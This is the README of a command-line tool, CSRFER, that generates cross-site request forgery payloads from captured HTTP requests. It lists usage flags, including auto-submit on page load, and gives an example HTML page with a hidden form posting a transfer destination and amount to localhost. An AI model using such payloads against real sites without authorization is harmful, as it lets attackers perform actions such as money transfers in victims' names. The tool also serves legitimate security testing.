# CSRFER

```plaintext

 _____  _________________ ___________ 
/  __ \/  ___| ___ \  ___|  ___| ___ \
| /  \/\ `--.| |_/ / |_  | |__ | |_/ /
| |     `--. \    /|  _| |  __||    / 
| \__/\/\__/ / |\ \| |   | |___| |\ \ 
 \____/\____/\_| \_\_|   \____/\_| \_|
                                      
          -.--.
          )  " '-,
          ',' 2  \_
           \q \ .  \
        _.--'  '----.__
       /  ._      _.__ \__
    _.'_.'  \_ .-._\_ '-, }
   (,/ _.---;-(  . \ \   ~
 ____ (  .___\_\  \/_/
(      '-._ \   \ |
 '._       ),> _) >
    '-._ c='  Cooo  -._
        '-._           '.
            '-._         `\
       snd      '-._       '.
                    '-._     \
                        `~---'
```

CSRFER is a tool to generate csrf payloads, based on vulnerable requests.

It parses supplied requests to generate either a form or a fetch request. The payload can then be embedded in an html template.

## Installation

```bash
npm install -g csrfer
```


## Usage:

```plaintext
Usage: csrfer [options]

Options:
  --version              Show version number
  -r, --request          Path to the request file to be used
  -m, --mode             Mode to generate the code. Available options: form, fetch. (Default is form)
  -a, --autosubmit       Auto submit the request on page load
  -s, --show             Show the form inputs (only for form mode)
  -o, --output           Output the payload to the specified file instead of STDOUT
  -t, --template         Path to an html template page. Use the placeholder {{CONTENT}} to specify where to
                         inject the code (in html, not JS)
  -T, --defaulttemplate  Use this option if you want the code to be injected into a default html page.
  -h, --help             Show help

Examples:
  csrfer -r req.txt -m form -a                    Automatically submit a form request
  csrfer -r req.txt -m form -s                    Generate and shows a form to be submitted manually
  csrfer -r req.txt -m fetch -t my_template.html  Generates a fetch request and uses the supplied template
                                                  page

```

## Example output
```html
<!DOCTYPE html>
<html>

<head>
  <title>This is Hello World page</title>
</head>

<body>
  <h1>Hello World</h1>

  <form id="csrf" name="csrf" action="http://localhost:8000/1.php" method="POST"
    enctype="application/x-www-form-urlencoded"><input id='destination' name='destination' type='hidden'
      value='123-123123-123' /><br><input id='amount' name='amount' type='hidden' value='50&#x20AC;' /><br><input
      type='submit' value='submit'></form>
</body>

</html>
```

## License

This project is MIT licensed